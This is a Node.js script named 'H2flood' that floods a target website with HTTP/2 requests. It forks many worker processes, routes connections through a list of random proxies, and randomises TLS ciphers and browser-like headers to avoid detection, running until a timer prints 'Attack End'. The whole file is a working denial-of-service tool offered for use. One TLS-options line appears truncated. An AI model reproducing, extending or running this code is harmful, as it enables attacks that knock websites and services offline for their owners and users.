const fs = require('fs');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const cluster = require('cluster');
var colors = require('colors');
const os = require("os");

process.on('uncaughtException', function(error) {});
process.on('unhandledRejection', function(error) {})

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);


if (process.argv.length < 7) {
    console.log(`Usage: ${process.argv[1]} target time rate thread proxyfile GET `)
    process.exit(1)
}

var target = process.argv[2];
var time = process.argv[3];
var reqs = process.argv[4];
var threads = process.argv[5];
var proxyfile = process.argv[6];
var mode = process.argv[7];
var proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var parsed = url.parse(target);
const payload = {};

if (cluster.isMaster) {
	console.log('H2flood | SCRIPT MADE BY @ThaiDuongScript'.cyan);
   for (let ads = 0; ads < threads; ads++) {
       cluster.fork();
   }
} else {
	const sigalgs = ['ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512', 'rsa_pss_rsae_sha256', 'rsa_pss_rsae_sha384', 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512'];
	const cplist = [
	"ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES128-SHA256", "ECDHE-RSA-AES128-SHA256", "ECDHE-ECDSA-AES256-SHA384", "ECDHE-RSA-AES256-SHA384"];
	var cipper = "";
	let SignalsList = sigalgs.join(':');

	function generatecipher() {
	  cipper = cplist[Math.floor(Math.random() * cplist.length)]
	}
	
	function main() {
		

		generatecipher();
      payload[':authority'] = parsed.host;
		payload[':method'] = mode;
		payload[':path'] = parsed.path;
		payload[':scheme'] = 'https';
		payload['accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
		payload['accept-encoding'] = 'gzip, deflate, br';
		payload['accept-language'] = 'en-US;q=0.8,en;q=0.7';
		payload['cache-control'] = 'max-age=0';
		payload['referer'] = target;
		payload['sec-ch-ua'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/128.0.6318.203 Chrome/128.0.6318.203 Safari/537.36';
		payload['sec-ch-ua-mobile'] = '?0';
		payload['sec-ch-ua-platform'] = '"Linux"';
		payload['sec-fetch-dest'] = 'document';
		payload['sec-fetch-mode'] = 'navigate';
		payload['sec-fetch-user'] = '?1';
		payload['upgrade-insecure-requests'] = '1';
		payload['user-agent'] = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36';

		this.curve = "GREASE:X25519:x25519";
		this.sigalgs = SignalsList;
		this.Opt = crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom		

		const keepAliveAgent = new http.Agent({
			keepAlive: true,
			keepAliveMsecs: 50000,
			maxSockets: Infinity
		});
		
		function Started() {
			for(let b=0; b < reqs; b++) {
				
				var proxy = proxies[Math.floor(Math.random() * proxies.length)];
				proxy = proxy.split(':');
				
				var connection = http['get']({
					host: proxy[0],
					port: proxy[1],
					ciphers: cipper,
					method: "CONNECT",
					agent: keepAliveAgent,
					path: parsed.host + ":443"				
				})
				connection.on('connect', function(res, socket, head) {
					const client = http2.connect(parsed.href, {
					  createConnection: () => {
						return tls.connect({
						  socket: socket,
						  ciphers: cipper,
						  host: parsed.host,
						  servername: parsed.host,
						  secure: true,
						  gzip: true,
						  followAllRedirects: true,
						  decodeEmails: false,
						  echdCurve: this.curve,
						  honorCipherOrder: true,
						  requestCert: true,
						  secureOptions: this.Opt,
						  sigalgs: this.sigalgs,
						  rejectUnauthorized: false,
						  ALPNProtocols: ['h2']
						}, () => {
							setInterval( () => {
								client.request(payload);
								connection.on("response", () => {
									connection.close();
								})
								connection.end();								
							})
						})
					  }
					})
				});
				connection.end();
			}
		}
		setInterval(Started);
		setTimeout(function() {
		  console.clear();
		  console.log('Attack End');
		  process.exit()
		}, time * 1000);
	}
	main();
}